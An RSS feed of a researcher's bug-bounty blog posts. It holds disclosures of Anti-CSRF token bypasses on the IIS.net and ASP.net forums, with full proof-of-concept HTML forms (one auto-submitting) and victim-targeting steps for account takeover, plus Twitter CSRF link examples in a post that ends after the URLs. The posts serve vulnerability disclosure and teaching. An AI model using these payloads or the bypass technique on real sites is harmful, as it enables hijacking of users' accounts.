<?xml version="1.0" encoding="ISO-8859-1"?>

<rss version="2.0" xmlns:dc="http://purl.org/dc/elements/1.1/" xmlns:content="http://purl.org/rss/1.0/modules/content/">
	<channel>
		<title>Garage4hackers Forum - Blogs - ajaysinghnegi</title>
		<link>http://garage4hackers.com/blog.php?u=54</link>
		<description>Garage4Hackers(G4H) is an open security community for Information Security enthusiasts, gurus and aspirants.Members of the team dedicate time and resources towards helping other information security aspirants, sharing knowledge,spreading security awareness and promoting research.</description>
		<language>en</language>
		<lastBuildDate>Sun, 22 Mar 2020 10:25:40 GMT</lastBuildDate>
		<generator>vBulletin</generator>
		<ttl>60</ttl>
		<image>
			<url>http://garage4hackers.com/images/misc/rss.jpg</url>
			<title>Garage4hackers Forum - Blogs - ajaysinghnegi</title>
			<link>http://garage4hackers.com/blog.php?u=54</link>
		</image>
		<item>
			<title>Microsofts IIS.net Anti-CSRF Token Bypass</title>
			<link>http://garage4hackers.com/entry.php?b=2599</link>
			<pubDate>Sun, 20 Apr 2014 10:02:05 GMT</pubDate>
			<description><![CDATA[*Microsoft's IIS.net CSRF Vulnerability* 
 
I want to share my another finding on Microsoft IIS.net which I have reported to them in August 2013. 
 
...]]></description>
			<content:encoded><![CDATA[<blockquote class="blogcontent restore">[B]Microsoft's IIS.net CSRF Vulnerability[/B]<br />
<br />
I want to share my another finding on Microsoft IIS.net which I have reported to them in August 2013.<br />
<br />
<br />
While  researching and working on bug bounties I have found that we can bypass  Anti-CSRF token validation even when it is getting validated on the  server-side and can execute CSRF. And after that using the CSRF we can  compromise the victims account by change email id of any users account  on that site to the attackers email id an then we can use the  forget password option to reset the victims account password.<br />
<br />
<br />
The   challenge was to execute the CSRF attack by bypassing the Anti-CSRF  token validation. I have found that the Anti-CSRF Token was getting  validated on the server-side. So, I tried to find the weakness in its  validation by various known ways like I tried to re-use one user  Anti-CSRF Token on another user account, then I tried to use the already  used token then I tried to check whether token is getting  validated on not and after that I tried to check that the token  validation is based on full length check but none of them worked as the  Token was getting  validated on server-side. <br />
<br />
<br />
Now  only 2 options left 1st option is that I  have to somehow predict or guess the token and 2nd options is that I  have to find the  weakness in the token validation itself so I tried to analyze the token  pattern, randomness, complexity, full length based validation etc but once again none worked :P so  then something again striked why not check any random value as Anti-CSRF  token by decreasing its length one-by-one without the same length as the current Anti-CSRF Token is having.<br />
<br />
<br />
So  for that I created 2 dummy account for testing purpose on IIS.net and  then crafted a CSRF payload as mentioned below which is containing a random  value as Anti-CSRF token which is having a length(70 Chars) as the current  Anti-CSRF Token. <br />
<br />
<br />
Then I continuously tried to send the CSRF request with the random values of 70 Chars as Anti-CSRF Token in decreasing order. <br />
<br />
<br />
So  1st CSRF request was containing Anti-CSRF Token value of 70 Chars next  will 69 then 68 so like that I tried approx 40 Requests which all failed  as the token was not getting validated on server-side but as I sent the  41th Request with the random value as Anti-CSRF Token with the length  of 30 Chars then the request got executed as the Anti-CSRF Token got  validated on server-side and guess what it worked :D.<br />
<br />
<br />
<br />
[B]Steps to execute this attack are as following:[/B]<br />
<br />
1. First copy the actual form submission request.<br />
<br />
[B]Actual Form Submission Request with Original Anti-CSRF Token Parameter Value:[/B]<br />
<br />
&lt;html&gt;<br />
  &lt;body&gt;<br />
    &lt;form action=&quot;https://forums.iis.net/user/editprofile.aspx&quot; method=&quot;POST&quot; enctype=&quot;multipart/form-data&quot;&gt;<br />
       &lt;input type=&quot;hidden&quot; name=&quot;__RequestVerificationToken&quot;  value=&quot;CIhXcKin7XcwYn8Y1hNVgP5eOOhAMn37dnZtFzziOqhflM423Z5JKkVPciRopfgcPau5tj&quot;  /&gt;<br />
      &lt;input type=&quot;hidden&quot; name=&quot;PostSortOrder&quot; value=&quot;0&quot; /&gt;<br />
      &lt;input type=&quot;hidden&quot; name=&quot;EnableDisplayInMemberList&quot; value=&quot;true&quot; /&gt;<br />
      &lt;input type=&quot;hidden&quot; name=&quot;EnableDisplayInMemberList&quot; value=&quot;false&quot; /&gt;<br />
      &lt;input type=&quot;hidden&quot; name=&quot;EnableUserAvatars&quot; value=&quot;true&quot; /&gt;<br />
      &lt;input type=&quot;hidden&quot; name=&quot;EnableUserAvatars&quot; value=&quot;false&quot; /&gt;<br />
      &lt;input type=&quot;hidden&quot; name=&quot;TimeZoneId&quot; value=&quot;Morocco Standard Time&quot; /&gt;<br />
      &lt;input type=&quot;hidden&quot; name=&quot;DateFormat&quot; value=&quot;MMM dd, yyyy&quot; /&gt;<br />
      &lt;input type=&quot;hidden&quot; name=&quot;EnableAvatar&quot; value=&quot;true&quot; /&gt;<br />
      &lt;input type=&quot;hidden&quot; name=&quot;EnableAvatar&quot; value=&quot;false&quot; /&gt;<br />
      &lt;input type=&quot;hidden&quot; name=&quot;edit-upload&quot; value=&quot;&quot; /&gt;<br />
      &lt;input type=&quot;hidden&quot; name=&quot;Name&quot; value=&quot;&quot; /&gt;<br />
      &lt;input type=&quot;hidden&quot; name=&quot;Location&quot; value=&quot;&quot; /&gt;<br />
      &lt;input type=&quot;hidden&quot; name=&quot;Occupation&quot; value=&quot;&quot; /&gt;<br />
      &lt;input type=&quot;hidden&quot; name=&quot;Interests&quot; value=&quot;&quot; /&gt;<br />
      &lt;input type=&quot;hidden&quot; name=&quot;WebAddress&quot; value=&quot;http://computersecuritywithethicalhacking.blogspot.in&quot; /&gt;<br />
      &lt;input type=&quot;hidden&quot; name=&quot;WebLog&quot; value=&quot;http://ajaysinghnegi.com&quot; /&gt;<br />
      &lt;input type=&quot;hidden&quot; name=&quot;Twitter&quot; value=&quot;ajaysinghnegi&quot; /&gt;<br />
      &lt;input type=&quot;hidden&quot; name=&quot;Bio&quot; value=&quot;&quot; /&gt;<br />
      &lt;input type=&quot;hidden&quot; name=&quot;Signature&quot; value=&quot;&quot; /&gt;<br />
      &lt;input type=&quot;hidden&quot; name=&quot;EnableEmail&quot; value=&quot;true&quot; /&gt;<br />
      &lt;input type=&quot;hidden&quot; name=&quot;EnableEmail&quot; value=&quot;false&quot; /&gt;<br />
      &lt;input type=&quot;hidden&quot; name=&quot;EnableHtmlEmail&quot; value=&quot;true&quot; /&gt;<br />
      &lt;input type=&quot;hidden&quot; name=&quot;EnableHtmlEmail&quot; value=&quot;false&quot; /&gt;<br />
      &lt;input type=&quot;hidden&quot; name=&quot;EnableThreadTracking&quot; value=&quot;false&quot; /&gt;<br />
      &lt;input type=&quot;hidden&quot; name=&quot;EmailPublic&quot; value=&quot;testtesting@gmail.com&quot; /&gt;<br />
      &lt;input type=&quot;hidden&quot; name=&quot;MsnIM&quot; value=&quot;test&quot; /&gt;<br />
      &lt;input type=&quot;hidden&quot; name=&quot;AolIM&quot; value=&quot;testing&quot; /&gt;<br />
      &lt;input type=&quot;hidden&quot; name=&quot;YahooIM&quot; value=&quot;test&quot; /&gt;<br />
      &lt;input type=&quot;hidden&quot; name=&quot;IcqIM&quot; value=&quot;testingg&quot; /&gt;<br />
      &lt;input type=&quot;hidden&quot; name=&quot;EmailPrivate&quot; value=&quot;ajaysinghnegi01@gmail.com&quot; /&gt;<br />
      &lt;input type=&quot;hidden&quot; name=&quot;FavoriteUsersShared&quot; value=&quot;false&quot; /&gt;<br />
      &lt;input type=&quot;hidden&quot; name=&quot;FavoritePostsShared&quot; value=&quot;false&quot; /&gt;<br />
      &lt;input type=&quot;hidden&quot; name=&quot;FavoriteForumsShared&quot; value=&quot;false&quot; /&gt;<br />
      &lt;input type=&quot;hidden&quot; name=&quot;submit&quot; value=&quot;Save All Changes&quot; /&gt;<br />
      &lt;input type=&quot;submit&quot; value=&quot;Submit form&quot; /&gt;<br />
    &lt;/form&gt;<br />
  &lt;/body&gt;<br />
&lt;/html&gt;<br />
<br />
2.  After that change the same Anti-CSRF  Token parameter __RequestVerificationToken values from  CIhXcKin7XcwYn8Y1hNVgP5eOOhAMn37dnZtFzziOqhflM423Z5JKkVPciRopfgcPau5tj  to ovomyQnYPxvPXfdxrjO1JEce3zPvGn  with 30 Chars length this modified value will be used as an Anti-CSRF  Token.<br />
<br />
[B]Account  Compromise &amp; Anti CSRF Token Bypass(Modified Form Submission  Request after changing the Anti-CSRF Token Parameter Value [/B][B][B] to 30 Chars Random Value[/B]):[/B]<br />
<br />
&lt;html&gt;<br />
  &lt;body&gt;<br />
    &lt;form action=&quot;https://forums.iis.net/user/editprofile.aspx&quot; method=&quot;POST&quot; enctype=&quot;multipart/form-data&quot;&gt;<br />
      &lt;input type=&quot;hidden&quot; name=&quot;__RequestVerificationToken&quot; value=&quot;ovomyQnYPxvPXfdxrjO1JEce3zPvGn&quot; /&gt;<br />
      &lt;input type=&quot;hidden&quot; name=&quot;PostSortOrder&quot; value=&quot;0&quot; /&gt;<br />
      &lt;input type=&quot;hidden&quot; name=&quot;EnableDisplayInMemberList&quot; value=&quot;true&quot; /&gt;<br />
      &lt;input type=&quot;hidden&quot; name=&quot;EnableDisplayInMemberList&quot; value=&quot;false&quot; /&gt;<br />
      &lt;input type=&quot;hidden&quot; name=&quot;EnableUserAvatars&quot; value=&quot;true&quot; /&gt;<br />
      &lt;input type=&quot;hidden&quot; name=&quot;EnableUserAvatars&quot; value=&quot;false&quot; /&gt;<br />
      &lt;input type=&quot;hidden&quot; name=&quot;TimeZoneId&quot; value=&quot;Morocco Standard Time&quot; /&gt;<br />
      &lt;input type=&quot;hidden&quot; name=&quot;DateFormat&quot; value=&quot;MMM dd, yyyy&quot; /&gt;<br />
      &lt;input type=&quot;hidden&quot; name=&quot;EnableAvatar&quot; value=&quot;true&quot; /&gt;<br />
      &lt;input type=&quot;hidden&quot; name=&quot;EnableAvatar&quot; value=&quot;false&quot; /&gt;<br />
      &lt;input type=&quot;hidden&quot; name=&quot;edit-upload&quot; value=&quot;&quot; /&gt;<br />
      &lt;input type=&quot;hidden&quot; name=&quot;Name&quot; value=&quot;&quot; /&gt;<br />
      &lt;input type=&quot;hidden&quot; name=&quot;Location&quot; value=&quot;&quot; /&gt;<br />
      &lt;input type=&quot;hidden&quot; name=&quot;Occupation&quot; value=&quot;&quot; /&gt;<br />
      &lt;input type=&quot;hidden&quot; name=&quot;Interests&quot; value=&quot;&quot; /&gt;<br />
      &lt;input type=&quot;hidden&quot; name=&quot;WebAddress&quot; value=&quot;http://computersecuritywithethicalhacking.blogspot.in&quot; /&gt;<br />
      &lt;input type=&quot;hidden&quot; name=&quot;WebLog&quot; value=&quot;http://ajaysinghnegi.com&quot; /&gt;<br />
      &lt;input type=&quot;hidden&quot; name=&quot;Twitter&quot; value=&quot;ajaysinghnegi&quot; /&gt;<br />
      &lt;input type=&quot;hidden&quot; name=&quot;Bio&quot; value=&quot;&quot; /&gt;<br />
      &lt;input type=&quot;hidden&quot; name=&quot;Signature&quot; value=&quot;&quot; /&gt;<br />
      &lt;input type=&quot;hidden&quot; name=&quot;EnableEmail&quot; value=&quot;true&quot; /&gt;<br />
      &lt;input type=&quot;hidden&quot; name=&quot;EnableEmail&quot; value=&quot;false&quot; /&gt;<br />
      &lt;input type=&quot;hidden&quot; name=&quot;EnableHtmlEmail&quot; value=&quot;true&quot; /&gt;<br />
      &lt;input type=&quot;hidden&quot; name=&quot;EnableHtmlEmail&quot; value=&quot;false&quot; /&gt;<br />
      &lt;input type=&quot;hidden&quot; name=&quot;EnableThreadTracking&quot; value=&quot;false&quot; /&gt;<br />
      &lt;input type=&quot;hidden&quot; name=&quot;EmailPublic&quot; value=&quot;testtesting@gmail.com&quot; /&gt;<br />
      &lt;input type=&quot;hidden&quot; name=&quot;MsnIM&quot; value=&quot;test&quot; /&gt;<br />
      &lt;input type=&quot;hidden&quot; name=&quot;AolIM&quot; value=&quot;testing&quot; /&gt;<br />
      &lt;input type=&quot;hidden&quot; name=&quot;YahooIM&quot; value=&quot;test&quot; /&gt;<br />
      &lt;input type=&quot;hidden&quot; name=&quot;IcqIM&quot; value=&quot;testingg&quot; /&gt;<br />
      &lt;input type=&quot;hidden&quot; name=&quot;EmailPrivate&quot; value=&quot;ajaysinghnegi01@gmail.com&quot; /&gt;<br />
      &lt;input type=&quot;hidden&quot; name=&quot;FavoriteUsersShared&quot; value=&quot;false&quot; /&gt;<br />
      &lt;input type=&quot;hidden&quot; name=&quot;FavoritePostsShared&quot; value=&quot;false&quot; /&gt;<br />
      &lt;input type=&quot;hidden&quot; name=&quot;FavoriteForumsShared&quot; value=&quot;false&quot; /&gt;<br />
      &lt;input type=&quot;hidden&quot; name=&quot;submit&quot; value=&quot;Save All Changes&quot; /&gt;<br />
      &lt;input type=&quot;submit&quot; value=&quot;Submit form&quot; /&gt;<br />
    &lt;/form&gt;<br />
  &lt;/body&gt;<br />
&lt;/html&gt;<br />
<br />
3. Then send this crafted CSRF payload code as a link to the victim.<br />
<br />
4.  As the victim executes that CSRF payload containing link the victims  account email id will be changed and the attack will receive an email to  confirm his email after confirming it the attacker can use the forget  password option to reset the and compromise the victims account.<br />
<br />
<br />
[B]Rootcause:[/B]<br />
<br />
Anti-CSRF  Token __RequestVerificationToken and its values CIhXcKin7XcwYn8Y1hNVgP5eOOhAMn37dnZtFzziOqhflM423Z5JKkVPciRopfgcPau5tj  validation was based on Partial Length based validation(i.e Anti-CSRF Token 1st 30 Chars  Length was only getting checked on Server-Side).<br />
<br />
<br />
[B]Impact:[/B]<br />
<br />
All  Microsoft IIS.net users were vulnerable to this CSRF attack using these  vulnerability the Attacker can bypass the Anti-CSRF Token Validation  and can Compromise the victims account.<br />
<br />
<br />
[B]Recommendation:[/B]<br />
<br />
Anti-CSRF  Token __RequestVerificationToken and its values  shall never be reusable in the attacker own account and any other users  account.<br />
<br />
CSRF token shall be properly validated on server-side instead of only Partial Length Based Validation.<br />
<br />
It shall be expired after use and it shall be 1 time useable.<br />
<br />
It should be generated randomly on each request.<br />
<br />
Instead of Post method PUT method shall be used.<br />
<br />
<br />
<br />
The vulnerability was mitigated by Microsoft Security Team in 14 days.<br />
<br />
<br />
So  in this way, one can bypass Anti-CSRF token validation and can also  compromise the victims account also this technique can be used to find  same type of vulnerability on different websites.<br />
<br />
<br />
Suggestions and Feedbacks are welcome.</blockquote>

]]></content:encoded>
			<dc:creator>ajaysinghnegi</dc:creator>
			<guid isPermaLink="true">http://garage4hackers.com/entry.php?b=2599</guid>
		</item>
		<item>
			<title>Microsofts Asp.net Anti-CSRF Token Bypass</title>
			<link>http://garage4hackers.com/entry.php?b=2598</link>
			<pubDate>Sun, 20 Apr 2014 09:51:06 GMT</pubDate>
			<description><![CDATA[*Microsoft's Asp.net CSRF Vulnerability* 
 
I want to share one of my finding on Microsoft Asp.net which I have reported to them in April 2013. 
...]]></description>
			<content:encoded><![CDATA[<blockquote class="blogcontent restore">[B]Microsoft's Asp.net CSRF Vulnerability[/B]<br />
<br />
I want to share one of my finding on Microsoft Asp.net which I have reported to them in April 2013.<br />
<br />
While  researching and working on bug bounties I have found that we can bypass  Anti-CSRF token validation even when it is getting validated on the  server-side and can execute CSRF. And after that using the CSRF we can  compromise the victims account by change email id of any users account  on that site to the attackers email id an then we can use the  forget password option to reset the victims account password.<br />
<br />
<br />
The  challenge was to execute the CSRF attack by bypassing the Anti-CSRF  token validation. I have found that the Anti-CSRF Token was getting  validated on the server-side. So, I tried to find the weakness in its  validation by various known ways like I tried to re-use one user  Anti-CSRF Token on another user account, then I tried to use the already  used token and after that I tried to check whether token is getting  validated on not but none of them worked as the Token was getting  validated on server-side. <br />
<br />
<br />
Now  only 2 options left 1st option is that I  have to somehow predict or guess the token and 2nd options is that I  have to find the  weakness in the token validation itself so I tried to analyze the token  pattern, randomness, complexity etc but once again none worked :P so  then something striked why not to use any random value as Anti-CSRF  token with the same length as the current Anti-CSRF Token is having.<br />
<br />
<br />
So  for that I created 2 dummy account for testing purpose on asp.net and  then crafted a CSRF payload as mentioned below which is containing a random  value as Anti-CSRF token which is having same length(70 Chars) as the current  Anti-CSRF Token and guess what it worked :D.<br />
<br />
<br />
[B]Steps to execute this attack are as following:[/B]<br />
<br />
1. First copy the actual form submission request.<br />
<br />
[B]Actual Form Submission Request with Original Anti-CSRF Token Parameter Value:[/B]<br />
<br />
&lt;html&gt;<br />
&lt;head&gt;<br />
&lt;/head&gt;<br />
&lt;body onload=document.forms[0].submit();&gt;<br />
    &lt;form action=&quot;https://forums.asp.net/user/editprofile.aspx&quot; method=&quot;POST&quot; enctype=&quot;multipart/form-data&quot;&gt;<br />
       &lt;input type=&quot;hidden&quot; name=&quot;__RequestVerificationToken&quot;  value=&quot;BHfUl2ElWyoSfGEOtEMc88WVcXgrCQDMlpe3rv0qoKfBIw7XtfpUfPPxbzMLAsdWlyvwHN&quot;  /&gt;<br />
      &lt;input type=&quot;hidden&quot; name=&quot;PostSortOrder&quot; value=&quot;0&quot; /&gt;<br />
      &lt;input type=&quot;hidden&quot; name=&quot;EnableDisplayInMemberList&quot; value=&quot;false&quot; /&gt;<br />
      &lt;input type=&quot;hidden&quot; name=&quot;EnableUserAvatars&quot; value=&quot;true&quot; /&gt;<br />
      &lt;input type=&quot;hidden&quot; name=&quot;EnableUserAvatars&quot; value=&quot;false&quot; /&gt;<br />
      &lt;input type=&quot;hidden&quot; name=&quot;TimeZoneId&quot; value=&quot;Morocco Standard Time&quot; /&gt;<br />
      &lt;input type=&quot;hidden&quot; name=&quot;DateFormat&quot; value=&quot;MMM dd, yyyy&quot; /&gt;<br />
      &lt;input type=&quot;hidden&quot; name=&quot;EnableAvatar&quot; value=&quot;false&quot; /&gt;<br />
      &lt;input type=&quot;hidden&quot; name=&quot;edit-upload&quot; value=&quot;&quot; /&gt;<br />
      &lt;input type=&quot;hidden&quot; name=&quot;Name&quot; value=&quot;&quot; /&gt;<br />
      &lt;input type=&quot;hidden&quot; name=&quot;Location&quot; value=&quot;&quot; /&gt;<br />
      &lt;input type=&quot;hidden&quot; name=&quot;Occupation&quot; value=&quot;&quot; /&gt;<br />
      &lt;input type=&quot;hidden&quot; name=&quot;Interests&quot; value=&quot;&quot; /&gt;<br />
      &lt;input type=&quot;hidden&quot; name=&quot;WebAddress&quot; value=&quot;http://computersecuritywithethicalhacking.blogspot.in&quot; /&gt;<br />
      &lt;input type=&quot;hidden&quot; name=&quot;WebLog&quot; value=&quot;test&quot; /&gt;<br />
      &lt;input type=&quot;hidden&quot; name=&quot;Twitter&quot; value=&quot;ajaysinghnegi&quot; /&gt;<br />
      &lt;input type=&quot;hidden&quot; name=&quot;Bio&quot; value=&quot;&quot; /&gt;<br />
      &lt;input type=&quot;hidden&quot; name=&quot;Signature&quot; value=&quot;&quot; /&gt;<br />
      &lt;input type=&quot;hidden&quot; name=&quot;EnableEmail&quot; value=&quot;false&quot; /&gt;<br />
      &lt;input type=&quot;hidden&quot; name=&quot;EnableHtmlEmail&quot; value=&quot;false&quot; /&gt;<br />
      &lt;input type=&quot;hidden&quot; name=&quot;EnableThreadTracking&quot; value=&quot;false&quot; /&gt;<br />
      &lt;input type=&quot;hidden&quot; name=&quot;EmailPublic&quot; value=&quot;testtesting@gmail.com&quot; /&gt;<br />
      &lt;input type=&quot;hidden&quot; name=&quot;MsnIM&quot; value=&quot;test&quot; /&gt;<br />
      &lt;input type=&quot;hidden&quot; name=&quot;AolIM&quot; value=&quot;testing&quot; /&gt;<br />
      &lt;input type=&quot;hidden&quot; name=&quot;YahooIM&quot; value=&quot;test&quot; /&gt;<br />
      &lt;input type=&quot;hidden&quot; name=&quot;IcqIM&quot; value=&quot;testingg&quot; /&gt;<br />
      &lt;input type=&quot;hidden&quot; name=&quot;EmailPrivate&quot; value=&quot;ajaysinghnegi01@gmail.com&quot; /&gt;<br />
      &lt;input type=&quot;hidden&quot; name=&quot;FavoriteUsersShared&quot; value=&quot;false&quot; /&gt;<br />
      &lt;input type=&quot;hidden&quot; name=&quot;FavoritePostsShared&quot; value=&quot;false&quot; /&gt;<br />
      &lt;input type=&quot;hidden&quot; name=&quot;FavoriteForumsShared&quot; value=&quot;false&quot; /&gt;<br />
      &lt;input type=&quot;hidden&quot; name=&quot;submit&quot; value=&quot;Save All Changes&quot; /&gt;&lt;/form&gt;<br />
&lt;/body&gt;<br />
&lt;/html&gt;<br />
<br />
 2.  After that change the same Anti-CSRF Token parameter  __RequestVerificationToken values from  BHfUl2ElWyoSfGEOtEMc88WVcXgrCQDMlpe3rv0qoKfBIw7XtfpUfPPxbzMLAsdWlyvwHN  to  yoSfGEOtEMc8BHfUlAsdWlyvwH2ElW8WVcXgr3rv0qoKfBIw7XtfpUfPPxbzMCQDMlpeLD  with same length this modified value will be used as an Anti-CSRF Token.<br />
<br />
[B]Account  Compromise &amp; Anti CSRF Token Bypass(Modified Form Submission  Request after changing the Anti-CSRF Token Parameter Value to 70 Chars  Random Value):[/B]<br />
<br />
&lt;html&gt;<br />
&lt;head&gt;<br />
&lt;/head&gt;<br />
&lt;body onload=document.forms[0].submit();&gt;<br />
    &lt;form action=&quot;https://forums.asp.net/user/editprofile.aspx&quot; method=&quot;POST&quot; enctype=&quot;multipart/form-data&quot;&gt;<br />
       &lt;input type=&quot;hidden&quot; name=&quot;__RequestVerificationToken&quot;  value=&quot;yoSfGEOtEMc8BHfUlAsdWlyvwH2ElW8WVcXgr3rv0qoKfBIw7XtfpUfPPxbzMCQDMlpeLD&quot;  /&gt;<br />
      &lt;input type=&quot;hidden&quot; name=&quot;PostSortOrder&quot; value=&quot;0&quot; /&gt;<br />
      &lt;input type=&quot;hidden&quot; name=&quot;EnableDisplayInMemberList&quot; value=&quot;false&quot; /&gt;<br />
      &lt;input type=&quot;hidden&quot; name=&quot;EnableUserAvatars&quot; value=&quot;true&quot; /&gt;<br />
      &lt;input type=&quot;hidden&quot; name=&quot;EnableUserAvatars&quot; value=&quot;false&quot; /&gt;<br />
      &lt;input type=&quot;hidden&quot; name=&quot;TimeZoneId&quot; value=&quot;Morocco Standard Time&quot; /&gt;<br />
      &lt;input type=&quot;hidden&quot; name=&quot;DateFormat&quot; value=&quot;MMM dd, yyyy&quot; /&gt;<br />
      &lt;input type=&quot;hidden&quot; name=&quot;EnableAvatar&quot; value=&quot;false&quot; /&gt;<br />
      &lt;input type=&quot;hidden&quot; name=&quot;edit-upload&quot; value=&quot;&quot; /&gt;<br />
      &lt;input type=&quot;hidden&quot; name=&quot;Name&quot; value=&quot;&quot; /&gt;<br />
      &lt;input type=&quot;hidden&quot; name=&quot;Location&quot; value=&quot;&quot; /&gt;<br />
      &lt;input type=&quot;hidden&quot; name=&quot;Occupation&quot; value=&quot;&quot; /&gt;<br />
      &lt;input type=&quot;hidden&quot; name=&quot;Interests&quot; value=&quot;&quot; /&gt;<br />
      &lt;input type=&quot;hidden&quot; name=&quot;WebAddress&quot; value=&quot;http://computersecuritywithethicalhacking.blogspot.in&quot; /&gt;<br />
      &lt;input type=&quot;hidden&quot; name=&quot;WebLog&quot; value=&quot;test&quot; /&gt;<br />
      &lt;input type=&quot;hidden&quot; name=&quot;Twitter&quot; value=&quot;ajaysinghnegi&quot; /&gt;<br />
      &lt;input type=&quot;hidden&quot; name=&quot;Bio&quot; value=&quot;&quot; /&gt;<br />
      &lt;input type=&quot;hidden&quot; name=&quot;Signature&quot; value=&quot;&quot; /&gt;<br />
      &lt;input type=&quot;hidden&quot; name=&quot;EnableEmail&quot; value=&quot;false&quot; /&gt;<br />
      &lt;input type=&quot;hidden&quot; name=&quot;EnableHtmlEmail&quot; value=&quot;false&quot; /&gt;<br />
      &lt;input type=&quot;hidden&quot; name=&quot;EnableThreadTracking&quot; value=&quot;false&quot; /&gt;<br />
      &lt;input type=&quot;hidden&quot; name=&quot;EmailPublic&quot; value=&quot;testtesting@gmail.com&quot; /&gt;<br />
      &lt;input type=&quot;hidden&quot; name=&quot;MsnIM&quot; value=&quot;test&quot; /&gt;<br />
      &lt;input type=&quot;hidden&quot; name=&quot;AolIM&quot; value=&quot;testing&quot; /&gt;<br />
      &lt;input type=&quot;hidden&quot; name=&quot;YahooIM&quot; value=&quot;test&quot; /&gt;<br />
      &lt;input type=&quot;hidden&quot; name=&quot;IcqIM&quot; value=&quot;testingg&quot; /&gt;<br />
      &lt;input type=&quot;hidden&quot; name=&quot;EmailPrivate&quot; value=&quot;ajaysinghnegi01@gmail.com&quot; /&gt;<br />
      &lt;input type=&quot;hidden&quot; name=&quot;FavoriteUsersShared&quot; value=&quot;false&quot; /&gt;<br />
      &lt;input type=&quot;hidden&quot; name=&quot;FavoritePostsShared&quot; value=&quot;false&quot; /&gt;<br />
      &lt;input type=&quot;hidden&quot; name=&quot;FavoriteForumsShared&quot; value=&quot;false&quot; /&gt;<br />
      &lt;input type=&quot;hidden&quot; name=&quot;submit&quot; value=&quot;Save All Changes&quot; /&gt;<br />
&lt;/form&gt;<br />
&lt;/body&gt;<br />
&lt;/html&gt;<br />
<br />
3. Then send this crafted CSRF payload code as a link to the victim.<br />
<br />
4.  As the victim executes that CSRF payload contianing link the victims  account email id will be changed and the attack will recieve an email to  confirm his email after confirming it the attacker can use the forget  password option to reset the and compromise the victims account.<br />
<br />
<br />
[B]Rootcause:[/B]<br />
<br />
Anti-CSRF  Token __RequestVerificationToken and its values  BHfUl2ElWyoSfGEOtEMc88WVcXgrCQDMlpe3rv0qoKfBIw7XtfpUfPPxbzMLAsdWlyvwHN  validation was based on Length based validation(i.e Anti-CSRF Token Full  Length was only getting checked on Server-Side).<br />
<br />
<br />
[B]Impact:[/B]<br />
<br />
All  Microsoft Asp.net users were vulnerable to this CSRF attack using these  vulnerability the Attacker can bypass the Anti-CSRF Token Validation  and can Compromise the victims account.<br />
<br />
<br />
[B]Recommendation:[/B]<br />
<br />
Anti-CSRF  Token __RequestVerificationToken and its values shall never be reusable  in the attacker own account and any other users account.<br />
<br />
CSRF Token shall be properly validated on server-side instead of only Length Based Validation.<br />
<br />
It shall be expired after use and it shall be 1 time useable.<br />
<br />
It should be generated randomly on each request.<br />
<br />
Instead of Post method PUT method shall be used.<br />
<br />
<br />
<br />
The vulnerability were mitigated by Microsoft Security Team in 12 days.<br />
<br />
<br />
So  in this way, one can bypass Anti-CSRF token validation and can also  compromise the victims account also this technique can be used to find  same type of vulnerability on different websites.<br />
<br />
<br />
Suggestions and Feedbacks are welcome.</blockquote>

]]></content:encoded>
			<dc:creator>ajaysinghnegi</dc:creator>
			<guid isPermaLink="true">http://garage4hackers.com/entry.php?b=2598</guid>
		</item>
		<item>
			<title>Twitter Follow Retweet and Tweet Favourite CSRF Vulnerabilities</title>
			<link>http://garage4hackers.com/entry.php?b=2596</link>
			<pubDate>Mon, 14 Apr 2014 07:46:54 GMT</pubDate>
			<description>*How we were able to find Twitter Follow Retweet and ***Tweet Favourite* CSRF* 
 
 
We want to share 3 of our findings on Twitter which me and my...</description>
			<content:encoded><![CDATA[<blockquote class="blogcontent restore">[B]How we were able to find Twitter Follow Retweet and [/B][B][B]Tweet Favourite[/B] CSRF[/B]<br />
<br />
<br />
[LEFT]We want to share 3 of our findings on Twitter which me and my friend Krutarth have reported to them on March 2014.My good friend @KrutarthShukla was testing Twitter and he was trying  deeply to find something on it. And finally he got a Follow CSRF and  after sometime later I also got Reweet &amp; Tweet Favourite CSRF. So,  we found 3 CSRF vulnerabilities on Twitter.<br />
[/LEFT]<br />
  <br />
As  you know On Twitter they send a mail almost daily with a following  subject line Do you know test, tester and testing on Twitter? which  contains the list of peoples who may know you on Twitter with there  profile link which has a follow button which contains a link with a Url  embeded in it using which you can follow the suggested peoples by  twitter.<br />
<br />
<br />
Also they send a mail once or twice in a month  with a following subject line Tweets from Test, Tester, Testing and 5  others which Contains the list trends on Twitter  for that month which contains Retweet and Tweet Favourite links with a  Url embeded in it using which you can Retweet the tweets and make the  Tweets Favourite which were suggested by Twitter. The links were as  mentioned below.<br />
[LEFT]<br />
<br />
[B]1. To Follow Someone Url was like this:[/B]<br />
<br />
[URL]https://twitter.com/i/redirect?url=https%3A%2F%2Ftwitter.com%2Fintent%2Ffollow%3Fea_u%3D85273509%26ea_e%3D1387571444%26screen_name%3DKrutarthShukla%26ea_s%3D7ecb564dcfdd9f2fa1d4b9e8c4ceb80ebf4761d8%26refsrc%3Demail&amp;sig=e1839b9361a4b64acf3b4cc4f5dc8b1fe4cfb21c&amp;uid=85273509&amp;iid=60cfddd3808c47c29f88ec5e3a7f5742&amp;nid=42+483+20131130&amp;t=1[/URL]<br />
<br />
<br />
[B]2. To Retweet Someones Tweets Url was like this: [/B]<br />
[LEFT][URL]https://twitter.com/i/redirect?url=https%3A%2F%2Ftwitter.com%2Fintent%2Fretweet%3Fea_u%3D85273509%26ea_e%3D1396125896%26tweet_id%3D442695320166617088%26ea_s%3D7ecb564dcfdd9f2fa1d4b9e8c4ceb80ebf4761d8%26refsrc%3Demail%26t%3D1%26sig%3De1839b9361a4b64acf3b4cc4f5dc8b1fe4cfb21c%26iid%3D60cfddd3808c47c29f88ec5e3a7f5742%26uid%3D85273509%26nid%3D42%2B483%2B2013113[/URL]  <br />
[/LEFT]<br />
<br />
<br />
<br />
<br />
[B]3. To Make Someones Tweets Favourite Url was like this:[/B]<br />
<br />
[URL]https://twitter.com/i/redirect?url=https%3A%2F%2Ftwitter.com%2Fintent%2Ffavorite%3Fea_u%3D85273509%26ea_e%3D1396125896%26tweet_id%3D442695320166617088%26ea_s%3D7ecb564dcfdd9f2fa1d4b9e8c4ceb80ebf4761d8%26refsrc%3Demail%26t%3D1%26sig%3De1839b9361a4b64acf3b4cc4f5dc8b1fe4cfb21c%26iid%3D60cfddd3808c47c29f88ec5e3a7f5742%26uid%3D85273509%26nid%3D42%2B483%2B20131130[/URL]<br />
[/LEFT]<br />
<br />
<br />
<br />
<br />
